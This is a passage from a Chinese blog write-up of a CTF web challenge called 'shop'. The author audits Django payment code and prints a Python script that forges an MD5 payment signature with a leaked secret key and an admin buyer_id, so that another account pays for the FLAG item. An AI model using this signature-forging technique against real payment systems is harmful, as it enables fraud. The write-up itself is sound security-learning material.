+<p>这里面学到了该如何审计python的代码，感觉跟php套路一样，还是得先去看一下设置文件对应就是这里面的<code>setting</code>文件，<br><a href="https://imgchr.com/i/iHrYzF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrYzF.md.png" alt="iHrYzF.md.png"></a><br>发现里面有一个空的<code>real flag</code>只是出题人把他给删掉了，这里面的重要信息就是这个secret.key是用于构造签名的<br>其实这个<code>secret.key</code>已经给了的，也存在于源码里面<br><a href="https://imgchr.com/i/iHrUsJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHrUsJ.md.png" alt="iHrUsJ.md.png"></a><br>然后重点看<code>urls.py.</code>以及<code>views.py</code>,如果<code>views.py</code>不存在<code>urls.py</code>里面的函数说明是调用了框架自身调用的函数，对于这个题而言没必要去查看框架本身的代码<br>这段代码在注册方面本身是没有任何问题的，所以得看其他方面<br>再查看shop里面的<code>urls.py</code>以及<code>views.py</code>可以发现里面存在购买对于身份的验证操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payOrder</span><span class="params">(request, orderid)</span>:</span></span><br><span class="line">	o = get_object_or_404(Order, id=orderid, user=request.user, status=Order.ONGOING)</span><br><span class="line">	form = &#123;</span><br><span class="line">		<span class="string">'order_id'</span>: o.id,</span><br><span class="line">		<span class="string">'buyer_id'</span>: o.user.id,</span><br><span class="line">		<span class="string">'good_id'</span>: o.good.id,</span><br><span class="line">		<span class="string">'buyer_point'</span>: o.user.profile.point,</span><br><span class="line">		<span class="string">'good_price'</span>: o.good.price,</span><br><span class="line">		<span class="string">'order_create_time'</span>: o.create_time.timestamp()</span><br><span class="line">	&#125;</span><br><span class="line">	str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">	<span class="comment">#print(str2sign)</span></span><br><span class="line">	sign = md5(str2sign).hexdigest()</span><br><span class="line">	<span class="comment">#print(sign)</span></span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">'payment/confirm.html'</span>, &#123;<span class="string">'form'</span>: form, <span class="string">'sign'</span>: sign&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>这段代码最后是跳到<code>payment</code>的路由下，我们可以继续追踪一下，发现<code>payment</code>下就一个<code>check</code>函数，关键的函数就在<code>views.py</code>里面，这里对交易做了详细的校验<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkPayment</span><span class="params">(request)</span>:</span></span><br><span class="line">	<span class="comment"># print(request.body)</span></span><br><span class="line">	ret = &#123;<span class="string">'result'</span>: <span class="string">'未知错误'</span>, <span class="string">'status'</span>: <span class="string">'danger'</span>&#125;</span><br><span class="line">	sign = request.GET.get(<span class="string">'signature'</span>, <span class="string">''</span>)</span><br><span class="line">	<span class="keyword">if</span> md5(RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + request.body).hexdigest() == sign:</span><br><span class="line">		o = get_object_or_404(Order, id=request.POST.get(<span class="string">'order_id'</span>))</span><br><span class="line">		g = get_object_or_404(Good, id=request.POST.get(<span class="string">'good_id'</span>))</span><br><span class="line">		u = get_object_or_404(User, id=request.POST.get(<span class="string">'buyer_id'</span>))</span><br><span class="line">		<span class="comment"># 检查订单是否为待支付状态</span></span><br><span class="line">		<span class="keyword">if</span> o.status != Order.ONGOING:</span><br><span class="line">			ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 状态异常，可能已完成或已取消'</span></span><br><span class="line">		<span class="comment"># 检查商品是否可购买</span></span><br><span class="line">		<span class="keyword">elif</span> g.available != <span class="keyword">True</span> <span class="keyword">or</span> g.amount &lt;= <span class="number">0</span>:</span><br><span class="line">			ret[<span class="string">'result'</span>] = <span class="string">f'商品 <span class="subst">&#123;g.id&#125;</span> 暂时不可购买，可能库存不足'</span></span><br><span class="line">		<span class="comment"># 检查用户可用积分是否足够</span></span><br><span class="line">		<span class="keyword">elif</span> u.profile.point &lt; g.price:</span><br><span class="line">			ret[<span class="string">'result'</span>] = <span class="string">f'用户 <span class="subst">&#123;u.username&#125;</span> 可用积分不足，无法完成支付'</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">if</span> u.is_staff != <span class="keyword">True</span>:</span><br><span class="line">				u.profile.point -= g.price</span><br><span class="line">				u.save()</span><br><span class="line">			g.amount -= <span class="number">1</span></span><br><span class="line">			<span class="keyword">if</span> g.name == <span class="string">'FLAG'</span>:</span><br><span class="line">				o.message = REAL_FLAG</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				o.message = <span class="string">f'fake_flag<span class="subst">&#123;&#123;&#123;md5(urandom(<span class="number">32</span>)).hexdigest()&#125;</span>&#125;&#125;&lt;br&gt;(购买“FLAG”才能获得真正的 flag)'</span></span><br><span class="line">			<span class="keyword">if</span> g.amount &lt;= randint(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">				g.amount += randint(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line">			g.save()</span><br><span class="line">			o.status = Order.FINISHED</span><br><span class="line">			o.save()</span><br><span class="line">			ret[<span class="string">'result'</span>] = <span class="string">f'订单 <span class="subst">&#123;o.id&#125;</span> 支付成功！'</span></span><br><span class="line">			ret[<span class="string">'status'</span>] = <span class="string">'success'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ret[<span class="string">'result'</span>] = <span class="string">'签名不正确，数据可能被篡改！'</span></span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">'payment/result.html'</span>, ret)</span><br></pre></td></tr></table></figure></p>
+<p>商品从三方面进行了校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.检查订单是否为待支付状态</span><br><span class="line">2.检查商品是否可购买</span><br><span class="line">3.检查用户可用积分是否足够</span><br></pre></td></tr></table></figure></p>
+<p>但是这三方面只是单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p>
+<p>根据它里面的代码去构造signature就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin'</span></span><br><span class="line">form = &#123;</span><br><span class="line">		<span class="string">'order_id'</span>: <span class="string">'148'</span>,</span><br><span class="line">		<span class="string">'buyer_id'</span>: <span class="string">'16'</span>,   <span class="comment">#admin账号id，从数据库得知</span></span><br><span class="line">		<span class="string">'good_id'</span>: <span class="string">'38'</span>,   <span class="comment"># 商品id也可从数据库得知</span></span><br><span class="line">		<span class="string">'buyer_point'</span>: <span class="string">'250'</span>,</span><br><span class="line">		<span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line">		<span class="string">'order_create_time'</span>: <span class="string">'1541706305.953427'</span> <span class="comment">#时间戳支付订单上有</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form]).encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="comment">#print(str2sign)</span></span><br><span class="line">sign = md5(str2sign).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure></p>
+<p>得到签名之后抓支付的包修改对应参数发包即可<br><a href="https://imgchr.com/i/iHraL9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHraL9.md.png" alt="iHraL9.md.png"></a><br>得到flag<br><a href="https://imgchr.com/i/iHr6zD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/08/iHr6zD.md.png" alt="iHr6zD.md.png"></a></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次月赛学到了几个点总结一下，第一就是学到PHP几个偏门小函数，第二就是一叶飘零学长出的题目的一波SQL注入的骚操作以及xxe文件读取的操作，第三就是执念于心学长出的逻辑漏洞的代码审计，如何去审计Django框架的代码，怎么去发现无双向检验的logic漏洞，复习去了2333</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/anheng-10month.html">安恒10月赛Web题目复现</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
+        <p><span>发布时间:</span>2018-11-08, 20:46:41</p>
+        <p><span>最后更新:</span>2018-11-08, 22:04:40</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/anheng-10month.html" title="安恒10月赛Web题目复现">0verwatch.top/anheng-10month.html</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/anheng-10month.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/algorithm-review.html">
+                    算法上机考试复习
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+   
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>听说，打赏我的人最后都成了大佬。</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+          <div id="wechat" style="display: inline-block;">
+            <img id="wechat_qr" src="/img/wechatpay.jpg" alt="0verWatch WeChat Pay"/>
+            <p>微信打赏</p>
+          </div>
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/img/alipay.jpg" alt="0verWatch Alipay"/>
+            <p>支付宝打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-audit"><span class="toc-number">2.1.</span> <span class="toc-text">easy audit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#手速要快"><span class="toc-number">2.2.</span> <span class="toc-text">手速要快</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CoolCms"><span class="toc-number">3.</span> <span class="toc-text">CoolCms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shop"><span class="toc-number">4.</span> <span class="toc-text">shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">5.</span> <span class="toc-text">小结</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+              
+        <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80MDk1Ny8xNzQ4Mg==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+       if (typeof LivereTower === 'function') { return; }
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>。 
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/algorithm-review.html" title="下一篇: 算法上机考试复习">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/anheng-10month.html">安恒10月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/algorithm-review.html">算法上机考试复习</a></li><li class="post-list-item"><a class="post-list-link" href="/huwang-game.html">护网杯部分题目题解</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-CTF-Platform.html">CUMT平台的部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-9month.html">安恒9月部分赛题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirstv2.html">Hitcon2017 babyfirst-revenge v2复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2015-babyfirst.html">Hitcon2015 babyfirst复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirst.html">Hitcon2017 babyfirst-revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/liuliangfenxi-5-5.html">铁三2018.5.5数据分析</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-8month-part1.html">安恒8月应急响应题目回顾</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-4.html">sqli-labs实战记录(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-3.html">sqli-labs实战记录(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-2.html">sqli-labs实战记录(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-1.html">sqli-labs实战记录(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/bin-search-sql.html">二分查找在sql盲注里面的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/Solve-Me-wp.html">Solve Me解题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-inject-protect.html">浅谈SQL注入防御手段</a></li><li class="post-list-item"><a class="post-list-link" href="/sqlmap-usage.html">Sqlmap 使用方法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-FW.html">Linux防火墙学习</a></li><li class="post-list-item"><a class="post-list-link" href="/Mysql-security-1.html">Mysql安全配置</a></li><li class="post-list-item"><a class="post-list-link" href="/pentest-1.html">记录一次模拟渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-2.html">计网实验笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-1.html">计网实验笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-exam.html">微机实验考试</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-experiment.html">微机实验记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-6month.html">安恒6月赛部分做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-2.html">数据结构复习二 双向链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-1.html">数据结构复习一 单链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/writing-1.html">两年</a></li><li class="post-list-item"><a class="post-list-link" href="/Yii-probleam.html">编写Yii框架项目时出现的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/susctf2018-wp.html">SUSCTF 2018 做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-CTFd-building.html">Docker练习及在CTFd平台上放题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTFd-building.html">CTFd平台搭建记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-learning.html">Docker学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/ISCC-2018-wp.html">ISCC 2018做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-5month.html">安恒5月赛web题目做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-2018-final.html">cumt2018校赛部分write up</a></li><li class="post-list-item"><a class="post-list-link" href="/git-learning.html">Git学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/PHP-Yii.html">PHP_Yii框架学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web1.html">WhaleCTF第一期打卡的几个web题目</a></li><li class="post-list-item"><a class="post-list-link" href="/shiyanba1-wp.html">实验吧 忘记密码了wp</a></li><li class="post-list-item"><a class="post-list-link" href="/phpcheck2.html">记一道代码审计题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTF-python.html">小结一波CTF里面可能用到的脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/Ubantu-Web.html">Ubantu下部署LAMP以及复现一道CTF题目</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-php-fanxuliehua.html">浅析cumt平台上的一道反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/RaceConditionsSummary.html">简单小结一下Web条件竞争的题目</a></li><li class="post-list-item"><a class="post-list-link" href="/hash-length-attack.html">记录一下Hash长度扩展攻击的几个题目</a></li><li class="post-list-item"><a class="post-list-link" href="/moctf-web.html">简单小结一下moctf的三道web题</a></li><li class="post-list-item"><a class="post-list-link" href="/backup-blog-again.html">重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</a></li><li class="post-list-item"><a class="post-list-link" href="/RSA-SimpleLearn.html">大致了解一下RSA以及出题套路</a></li><li class="post-list-item"><a class="post-list-link" href="/CRC32-Brute.html">CRC32爆破小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-learn.html">熟悉Linux命令~~~</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-php-check.html">bugku 代码审计 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Web-write-up.html">bugku Web write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Misc.html">bugku Misc write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Crypto.html">bugku Crypto write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-social-wp.html">bugku Social write up</a></li><li class="post-list-item"><a class="post-list-link" href="/zipfalse.html">zip伪加密[转载]</a></li><li class="post-list-item"><a class="post-list-link" href="/php-mysql-content.html">php+mysql留言板实现代码分享</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-Summary.html">对数据库学习的大致总结</a></li><li class="post-list-item"><a class="post-list-link" href="/php summary.html">php留言板编写总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work4.html">程序设计课 C#的作业报告四</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work3.html">程序设计课 C#的作业报告三</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work2.html">程序设计课 C#作业报告二</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work1.html">程序设计课 C#的作业报告一</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 0verWatch
+
+            </div>
+            <div class="footer-right">
+                Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> 
+                <span>|  Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+
+                
+
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//lib.baomitu.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-119588656-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
